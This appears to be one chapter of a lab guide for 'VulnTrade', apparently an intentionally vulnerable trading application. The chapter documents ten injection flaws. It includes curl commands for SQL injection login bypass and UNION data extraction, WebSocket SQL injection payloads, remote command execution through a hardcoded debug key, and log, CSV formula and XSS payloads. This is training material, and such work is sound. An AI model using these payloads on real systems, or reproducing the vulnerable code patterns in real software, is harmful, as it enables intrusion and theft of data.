# 03 — Injection

## Overview
VulnTrade has injection vulnerabilities across multiple channels: traditional REST SQL injection, SQL injection over WebSocket/STOMP (a rare and often missed attack surface), Remote Code Execution via a debug endpoint, log injection, and CSV formula injection. The WebSocket SQLi is particularly noteworthy — WAFs typically cannot inspect STOMP frames.

---

## Vulnerabilities

### INJ-01: SQL Injection — Legacy Login Endpoint
| Field | Value |
|-------|-------|
| Severity | Critical |
| OWASP | A03: Injection |
| CWE | CWE-89 |
| Difficulty | Beginner |
| Endpoint | `POST /api/auth/login-legacy` |
| File | `AuthController.java:119` |

**Description:** Username is concatenated directly into SQL: `"SELECT * FROM users WHERE username='" + username + "'"`.

**How to exploit:**
```bash
# Authentication bypass
curl -X POST http://localhost:8085/api/auth/login-legacy \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR 1=1 --","password":"anything"}'

# UNION-based extraction
curl -X POST http://localhost:8085/api/auth/login-legacy \
  -H "Content-Type: application/json" \
  -d '{"username":"'\'' UNION SELECT 1,flag_value,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32 FROM flags --","password":"x"}'
```

---

### INJ-02: SQL Injection — WebSocket Trade History (startDate)
| Field | Value |
|-------|-------|
| Severity | Critical |
| OWASP | A03: Injection |
| CWE | CWE-89 |
| Difficulty | Intermediate |
| Endpoint | WebSocket `/app/trade.getHistory` |
| File | `CustomQueryRepository.java:33` |

**Description:** The `startDate` parameter is concatenated into SQL: `" AND t.executed_at >= '" + startDate + "'"`. This is injectable over STOMP WebSocket — a vector that WAFs typically miss.

**How to exploit (via UI):**
1. Go to History page
2. In "Start Date" field, enter: `2020-01-01' UNION SELECT 1, flag_value, 3, 4, now() FROM flags --`
3. Click "Load via WebSocket"
4. Results appear in the trades table

**How to exploit (via Burp Suite):**
Intercept the WebSocket SEND frame and modify the `startDate` field in the JSON body.

See [../websocket-sqli-guide.md](../websocket-sqli-guide.md) for detailed STOMP SQLi techniques.

---

### INJ-03: SQL Injection — WebSocket Trade History (endDate)
| Field | Value |
|-------|-------|
| Severity | Critical |
| OWASP | A03: Injection |
| CWE | CWE-89 |
| Difficulty | Intermediate |
| Endpoint | WebSocket `/app/trade.getHistory` |
| File | `CustomQueryRepository.java:36` |

**Description:** Same as INJ-02 but via the `endDate` parameter.

---

### INJ-04: SQL Injection — WebSocket Trade History (symbol)
| Field | Value |
|-------|-------|
| Severity | Critical |
| OWASP | A03: Injection |
| CWE | CWE-89 |
| Difficulty | Intermediate |
| Endpoint | WebSocket `/app/trade.getHistory` |
| File | `CustomQueryRepository.java:39` |

**Description:** The `symbol` parameter: `" AND t.symbol = '" + symbol + "'"`.

**Example payload (in Symbol field):**
```
' UNION SELECT 1, table_name::text, 3, 4, now() FROM information_schema.tables WHERE table_schema='public' --
```

---

### INJ-05: SQL Injection — Admin Query Executor
| Field | Value |
|-------|-------|
| Severity | Critical |
| OWASP | A03: Injection |
| CWE | CWE-89 |
| Difficulty | Beginner |
| Endpoint | `POST /api/admin/execute-query` |
| File | `CustomQueryRepository.java:55` |

**Description:** Executes raw SQL queries directly. While intended for admin use only, the admin role is forgeable via JWT tampering.

---

### INJ-06: Remote Code Execution (RCE) via Debug Endpoint
| Field | Value |
|-------|-------|
| Severity | Critical |
| OWASP | A03: Injection |
| CWE | CWE-78 |
| Difficulty | Advanced |
| Endpoint | `POST /api/debug/execute` |
| File | `DebugController.java:68` |

**Description:** Executes OS commands via `Runtime.getRuntime().exec()`. Protected by a hardcoded debug key (`vulntrade-debug-key-2024`) that's discoverable in the source code and config files.

**How to exploit:**
```bash
curl -X POST http://localhost:8085/api/debug/execute \
  -H "X-Debug-Key: vulntrade-debug-key-2024" \
  -H "Content-Type: application/json" \
  -d '{"command":"cat /opt/flags/flag5.txt"}'
# Returns: FLAG{rc3_f1l3syst3m_4cc3ss}
```

---

### INJ-07: Log Injection via Reason Field
| Field | Value |
|-------|-------|
| Severity | Medium |
| OWASP | A03: Injection |
| CWE | CWE-117 |
| Difficulty | Intermediate |
| Endpoint | `POST /api/admin/adjust-balance` |
| File | `AuditService.java:36` |

**Description:** The `reason` field in balance adjustments is logged without sanitization. Newline characters inject fake log entries.

**Example payload:** `legitimate reason\n[SECURITY] Admin password changed to: hacked123`

---

### INJ-08: CSV Formula Injection via Export
| Field | Value |
|-------|-------|
| Severity | Medium |
| OWASP | A03: Injection |
| CWE | CWE-1236 |
| Difficulty | Intermediate |
| Endpoint | `GET /api/export/trades` |

**Description:** Trade data exported as CSV can contain formula injection payloads. If a trade symbol or description contains `=CMD()`, it executes when opened in Excel.

---

### INJ-09: Stored XSS via Price Alert Symbol
| Field | Value |
|-------|-------|
| Severity | High |
| OWASP | A03: Injection |
| CWE | CWE-79 |
| Difficulty | Intermediate |
| Endpoint | WebSocket `/app/trade.setAlert` |
| File | `AlertService.java:47` |

**Description:** Alert symbols are stored without sanitization and broadcast to other users via WebSocket. A malicious symbol like `<img src=x onerror=alert(1)>` persists and renders in other users' browsers.

---

### INJ-10: dangerouslySetInnerHTML in Dashboard
| Field | Value |
|-------|-------|
| Severity | High |
| OWASP | A03: Injection |
| CWE | CWE-79 |
| Difficulty | Intermediate |
| File | `DashboardPage.js:352,356` |

**Description:** Symbol names in the market prices table use `dangerouslySetInnerHTML` for rendering. If a symbol name contains HTML/JavaScript, it executes in every user's browser viewing the dashboard.
